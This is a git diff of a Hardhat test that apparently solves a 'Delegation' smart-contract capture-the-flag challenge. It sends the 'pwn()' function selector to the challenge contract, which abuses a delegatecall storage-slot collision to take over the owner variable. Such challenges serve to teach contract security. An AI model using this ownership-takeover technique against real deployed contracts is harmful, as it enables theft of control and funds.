@@ -2,6 +2,7 @@ import { expect } from "chai";
 import { BigNumber, Contract, Signer } from "ethers";
 import { ethers } from "hardhat";
 import { createChallenge, submitLevel } from "./utils";
+const BN = BigNumber;
 
 let accounts: Signer[];
 let eoa: Signer;
@@ -20,6 +21,13 @@ before(async () => {
 });
 
 it("solves the challenge", async function () {
+
+  // owner in Delegate has the same address slot as owner in Delegation
+  let functionSig = ethers.utils.keccak256(ethers.utils.toUtf8Bytes("pwn()")).substring(0,10)
+
+  // https://gist.github.com/spalladino/a349f0ca53dbb5fc3914243aaf7ea8c6
+  eoa.sendTransaction({to:challenge.address, data:functionSig, gasLimit:BN.from(`50000`)})
+
 });
 
 after(async () => {
